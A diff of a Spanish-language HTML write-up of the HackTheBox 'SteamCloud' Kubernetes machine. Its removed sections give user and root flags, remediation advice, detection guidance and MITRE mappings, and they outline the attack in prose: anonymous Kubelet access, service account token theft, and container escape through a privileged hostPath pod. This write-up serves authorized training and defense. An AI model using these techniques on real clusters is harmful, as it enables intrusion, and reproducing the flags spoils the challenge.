+<div class="gloss-def">Plataforma open-source de orquestación de containers. Gestiona el despliegue, escalado y operación de aplicaciones en contenedores. Usado en producción por la mayoría de empresas tecnológicas.</div>
+</div>
+<div class="gloss-item">
+<div class="gloss-term">Kubelet</div>
+<div class="gloss-def">Agente que corre en cada nodo del cluster. Recibe instrucciones del API Server y gestiona los pods localmente. Expone API HTTPS en el puerto 10250.</div>
+</div>
+<div class="gloss-item">
+<div class="gloss-term">Pod</div>
+<div class="gloss-def">La unidad más pequeña de Kubernetes. Agrupa uno o más containers que comparten red y almacenamiento. Cada pod recibe su propia IP dentro del cluster.</div>
+</div>
+<div class="gloss-item">
+<div class="gloss-term">Service Account (SA)</div>
+<div class="gloss-def">Identidad para pods en Kubernetes. Permite al pod autenticarse contra el API Server. Cada namespace tiene un SA "default" que se asigna automáticamente a los pods.</div>
+</div>
+<div class="gloss-item">
+<div class="gloss-term">RBAC (Role-Based Access Control)</div>
+<div class="gloss-def">Sistema de permisos en Kubernetes. Define qué operaciones (get, list, create, delete) puede realizar cada usuario o SA sobre qué recursos (pods, secrets, etc.).</div>
+</div>
+<div class="gloss-item">
+<div class="gloss-term">etcd</div>
+<div class="gloss-def">Base de datos distribuida clave-valor que almacena todo el estado del cluster Kubernetes: configuración, secrets, tokens, certificados. Si se compromete, se compromete todo el cluster.</div>
+</div>
+<div class="gloss-item">
+<div class="gloss-term">hostPath Volume</div>
+<div class="gloss-def">Tipo de volumen en Kubernetes que monta un directorio del nodo host dentro del container. Útil para casos legítimos, pero peligroso si se usa con <code>path: /</code> sin restricciones.</div>
+</div>
+<div class="gloss-item">
+<div class="gloss-term">Container Escape</div>
+<div class="gloss-def">Técnica que permite a un atacante salir del aislamiento de un container y obtener acceso al nodo host subyacente. Generalmente requiere privilegios elevados dentro del container.</div>
+</div>
+</div>
+    </div>
+
   </div>
 
-  <!-- 6: FLAGS -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">6</div>
-      <h2>Flags</h2>
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <h3>Detalles del Reto</h3>
+      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">EASY</span></div>
+      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
+      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.96.167</span></div>
+      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Machine</span></div>
+      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">Kubelet Unauthenticated</span></div>
+      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">Misconfiguration</span></div>
     </div>
-    <div class="card-body" style="display:flex; flex-direction:column; gap:12px;">
-      <div class="flag-box">
-        <div class="flag-icon">🚩</div>
-        <div class="flag-content">
-          <div class="flag-label">User Flag — /home/user/user.txt</div>
-          <div class="flag-value">6734efbebc0831674ffa2ffc3659ccee</div>
-        </div>
-      </div>
-      <div class="flag-box">
-        <div class="flag-icon">👑</div>
-        <div class="flag-content">
-          <div class="flag-label">Root Flag — /root/root.txt</div>
-          <div class="flag-value">c2aca3eae3d1d3bbce9237303b2f3d50</div>
-        </div>
-      </div>
+    <div class="sidebar-card">
+      <h3>Skills Demostradas</h3>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">Kubernetes</span><span class="skill-pct">95%</span></div><div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">Container Escape</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">RBAC Exploitation</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
     </div>
-  </div>
-
-  <!-- 7: RECOMENDACIONES -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">7</div>
-      <h2>Recomendaciones de Seguridad</h2>
-    </div>
-    <div class="card-body">
-      <div class="rec-grid">
-        <div class="rec-card">
-          <div class="rec-priority" style="color:var(--red)">CRÍTICA — Inmediata</div>
-          <div class="rec-title">Deshabilitar acceso anónimo al Kubelet</div>
-          <div class="rec-desc">Configurar <code>--anonymous-auth=false</code> en el Kubelet y <code>--authorization-mode=Webhook</code> para requerir autenticación.</div>
-        </div>
-        <div class="rec-card">
-          <div class="rec-priority" style="color:var(--red)">CRÍTICA — Inmediata</div>
-          <div class="rec-title">Revisar permisos RBAC del SA default</div>
-          <div class="rec-desc">El Service Account <code>default</code> no debe tener permisos <code>create pods</code>. Usar RBAC con mínimo privilegio y SAs dedicados por aplicación.</div>
-        </div>
-        <div class="rec-card">
-          <div class="rec-priority" style="color:var(--orange)">ALTA — Corto plazo</div>
-          <div class="rec-title">Implementar Pod Security Admission</div>
-          <div class="rec-desc">Configurar PSA en modo <code>restricted</code> para bloquear pods con <code>privileged: true</code> y <code>hostPath</code> mounts en <code>/</code>.</div>
-        </div>
-        <div class="rec-card">
-          <div class="rec-priority" style="color:var(--orange)">ALTA — Corto plazo</div>
-          <div class="rec-title">Network Policy para el Kubelet</div>
-          <div class="rec-desc">Restringir acceso al puerto 10250 del Kubelet solo al API Server y herramientas de monitoreo autorizadas mediante Network Policies.</div>
-        </div>
-        <div class="rec-card">
-          <div class="rec-priority" style="color:var(--yellow)">MEDIA — Medio plazo</div>
-          <div class="rec-title">Segmentar etcd con TLS mutuo</div>
-          <div class="rec-desc">Asegurar que etcd en 2379 requiera certificados de cliente válidos y que solo el API Server tenga acceso.</div>
-        </div>
-        <div class="rec-card">
-          <div class="rec-priority" style="color:var(--yellow)">MEDIA — Medio plazo</div>
-          <div class="rec-title">Audit logging de Kubernetes</div>
-          <div class="rec-desc">Habilitar Kubernetes audit logs para detectar creación de pods privilegiados, acceso anónimo al Kubelet, y uso inusual de service accounts.</div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- 8: LECCIONES -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">8</div>
-      <h2>Lecciones Aprendidas</h2>
-    </div>
-    <div class="card-body">
-      <h3>Para el Atacante (Red Team)</h3>
-      <ul>
-        <li>El <strong>puerto 10250 con acceso anónimo</strong> es una vulnerabilidad crítica en Kubernetes — siempre probar <code>GET /pods</code> sin credenciales como primer paso.</li>
-        <li>El <strong>Service Account token</strong> dentro de cualquier pod puede tener permisos inesperados — siempre extraerlo y verificar con <code>kubectl auth can-i --list</code> o el API.</li>
-        <li>Un pod con <code>privileged: true</code> + <code>hostPath: /</code> equivale a acceso root al nodo host — la técnica más rápida de container escape en Kubernetes.</li>
-        <li><strong>Usar <code>--data-urlencode</code></strong> para evitar problemas de encoding al pasar comandos al endpoint /run del Kubelet.</li>
-        <li>La imagen <code>nginx:1.14.2</code> ya existe en caché — el pod arranca en segundos sin necesitar pull de internet.</li>
-      </ul>
-      <h3 style="margin-top: 16px;">Para el Defensor (Blue Team)</h3>
-      <ul>
-        <li><strong>Detectar en logs:</strong> Acceso al endpoint <code>/pods</code> del Kubelet sin Bearer token → alerta inmediata. POST a <code>/run/</code> en Kubelet → alerta crítica.</li>
-        <li><strong>IOCs de este ataque:</strong> Nuevo pod <code>ghost-pwn</code> creado con <code>privileged: true</code> + <code>hostPath: /</code>; SA <code>default</code> usando token fuera del pod nginx.</li>
-        <li><strong>Regla Sigma:</strong> Detectar creación de pods con <code>securityContext.privileged: true</code> o <code>hostPath.path: /</code> via el Kubernetes audit log.</li>
-        <li><strong>CIS Benchmark:</strong> CIS Kubernetes 4.2.1 (deshabilitar anon-auth en Kubelet) y 5.2.2 (no usar pods privilegiados) son los controles relevantes.</li>
-      </ul>
-    </div>
-  </div>
-
-  <!-- 9: GLOSARIO -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">9</div>
-      <h2>Glosario de Términos</h2>
-    </div>
-    <div class="card-body">
-      <div class="gloss-item">
-        <div class="gloss-term">Kubernetes (K8s)</div>
-        <div class="gloss-def">Plataforma open-source de orquestación de containers. Gestiona el despliegue, escalado y operación de aplicaciones en contenedores. Usado en producción por la mayoría de empresas tecnológicas.</div>
-      </div>
-      <div class="gloss-item">
-        <div class="gloss-term">Kubelet</div>
-        <div class="gloss-def">Agente que corre en cada nodo del cluster. Recibe instrucciones del API Server y gestiona los pods localmente. Expone API HTTPS en el puerto 10250.</div>
-      </div>
-      <div class="gloss-item">
-        <div class="gloss-term">Pod</div>
-        <div class="gloss-def">La unidad más pequeña de Kubernetes. Agrupa uno o más containers que comparten red y almacenamiento. Cada pod recibe su propia IP dentro del cluster.</div>
-      </div>
-      <div class="gloss-item">
-        <div class="gloss-term">Service Account (SA)</div>
-        <div class="gloss-def">Identidad para pods en Kubernetes. Permite al pod autenticarse contra el API Server. Cada namespace tiene un SA "default" que se asigna automáticamente a los pods.</div>
-      </div>
-      <div class="gloss-item">
-        <div class="gloss-term">RBAC (Role-Based Access Control)</div>
-        <div class="gloss-def">Sistema de permisos en Kubernetes. Define qué operaciones (get, list, create, delete) puede realizar cada usuario o SA sobre qué recursos (pods, secrets, etc.).</div>
-      </div>
-      <div class="gloss-item">
-        <div class="gloss-term">etcd</div>
-        <div class="gloss-def">Base de datos distribuida clave-valor que almacena todo el estado del cluster Kubernetes: configuración, secrets, tokens, certificados. Si se compromete, se compromete todo el cluster.</div>
-      </div>
-      <div class="gloss-item">
-        <div class="gloss-term">hostPath Volume</div>
-        <div class="gloss-def">Tipo de volumen en Kubernetes que monta un directorio del nodo host dentro del container. Útil para casos legítimos, pero peligroso si se usa con <code>path: /</code> sin restricciones.</div>
-      </div>
-      <div class="gloss-item">
-        <div class="gloss-term">Container Escape</div>
-        <div class="gloss-def">Técnica que permite a un atacante salir del aislamiento de un container y obtener acceso al nodo host subyacente. Generalmente requiere privilegios elevados dentro del container.</div>
-      </div>
-    </div>
-  </div>
-
-</div><!-- /main -->
-
-<!-- SIDEBAR -->
-<div class="sidebar">
-
-  <div class="scard">
-    <div class="scard-title">Target Info</div>
-    <div class="scard-body">
-      <div class="sinfo-row"><span class="sinfo-label">IP</span><span class="sinfo-value">10.129.96.167</span></div>
-      <div class="sinfo-row"><span class="sinfo-label">OS</span><span class="sinfo-value">Debian 10 (Buster)</span></div>
-      <div class="sinfo-row"><span class="sinfo-label">Kernel</span><span class="sinfo-value">4.19.0-18-amd64</span></div>
-      <div class="sinfo-row"><span class="sinfo-label">K8s</span><span class="sinfo-value">v1.22.3 (Minikube)</span></div>
-      <div class="sinfo-row"><span class="sinfo-label">SSH</span><span class="sinfo-value">OpenSSH 7.9p1</span></div>
-      <div class="sinfo-row"><span class="sinfo-label">Dificultad</span><span class="sinfo-value">Easy</span></div>
-      <div class="sinfo-row"><span class="sinfo-label">Fecha</span><span class="sinfo-value">2026-03-21</span></div>
-    </div>
-  </div>
-
-  <div class="scard">
-    <div class="scard-title">Flags</div>
-    <div class="scard-body" style="display:flex;flex-direction:column;gap:8px;">
-      <div style="background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);border-radius:6px;padding:8px 10px;">
-        <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px;">User</div>
-        <div style="font-family:monospace;font-size:11px;color:var(--yellow);word-break:break-all;">6734efbebc0831674ffa2ffc3659ccee</div>
-      </div>
-      <div style="background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);border-radius:6px;padding:8px 10px;">
-        <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px;">Root</div>
-        <div style="font-family:monospace;font-size:11px;color:var(--yellow);word-break:break-all;">c2aca3eae3d1d3bbce9237303b2f3d50</div>
+    <div class="sidebar-card">
+      <h3>Herramientas</h3>
+      <div class="tools-list">
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">kubectl</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">curl</span></div>
       </div>
     </div>
   </div>
+</div>
 
-  <div class="scard">
-    <div class="scard-title">Herramientas</div>
-    <div class="scard-body">
-      <div class="tool-item">
-        <span class="tool-icon">🔍</span>
-        <div><div class="tool-name">nmap</div><div class="tool-desc">Port scanning & service enum</div></div>
-      </div>
-      <div class="tool-item">
-        <span class="tool-icon">🌐</span>
-        <div><div class="tool-name">curl</div><div class="tool-desc">HTTP client para APIs REST</div></div>
-      </div>
-      <div class="tool-item">
-        <span class="tool-icon">🐍</span>
-        <div><div class="tool-name">python3</div><div class="tool-desc">Parsear JSON de APIs K8s</div></div>
-      </div>
-    </div>
-  </div>
-
-  <div class="scard">
-    <div class="scard-title">Tabla de Contenido</div>
-    <div class="scard-body">
-      <div class="toc-item"><span class="toc-num">01</span><a href="#">Descripción</a></div>
-      <div class="toc-item"><span class="toc-num">02</span><a href="#">Reconocimiento</a></div>
-      <div class="toc-item"><span class="toc-num">03</span><a href="#">Vulnerabilidades</a></div>
-      <div class="toc-item"><span class="toc-num">04</span><a href="#">Timeline</a></div>
-      <div class="toc-item"><span class="toc-num">05</span><a href="#">Explotación</a></div>
-      <div class="toc-item"><span class="toc-num">06</span><a href="#">Flags</a></div>
-      <div class="toc-item"><span class="toc-num">07</span><a href="#">Recomendaciones</a></div>
-      <div class="toc-item"><span class="toc-num">08</span><a href="#">Lecciones</a></div>
-      <div class="toc-item"><span class="toc-num">09</span><a href="#">Glosario</a></div>
-    </div>
-  </div>
-
-  <div class="scard">
-    <div class="scard-title">MITRE ATT&CK</div>
-    <div class="scard-body">
-      <div class="mitre-item">
-        <span class="mitre-id">T1046</span>
-        <span class="mitre-name">Network Service Discovery</span>
-      </div>
-      <div class="mitre-item">
-        <span class="mitre-id">T1613</span>
-        <span class="mitre-name">Container & Resource Discovery</span>
-      </div>
-      <div class="mitre-item">
-        <span class="mitre-id">T1610</span>
-        <span class="mitre-name">Deploy Container (privileged pod)</span>
-      </div>
-      <div class="mitre-item">
-        <span class="mitre-id">T1552.007</span>
-        <span class="mitre-name">Container API — SA Token Theft</span>
-      </div>
-      <div class="mitre-item">
-        <span class="mitre-id">T1611</span>
-        <span class="mitre-name">Escape to Host (hostPath mount)</span>
-      </div>
-    </div>
-  </div>
-
-</div><!-- /sidebar -->
-
-</div><!-- /grid -->
-</div><!-- /container -->
-
-<footer>
-  <p>Reporte generado por <strong>Ghost-Ops Framework</strong> · HackTheBox SteamCloud · 2026-03-21</p>
-  <p style="margin-top:4px;font-size:11px;">Fines educativos — Pentesting autorizado en entorno HTB</p>
-</footer>
-
+<script>
+  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
+  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
+  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
+  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
+  setInterval(drawMatrix,35);
+</script>
 </body>
 </html>
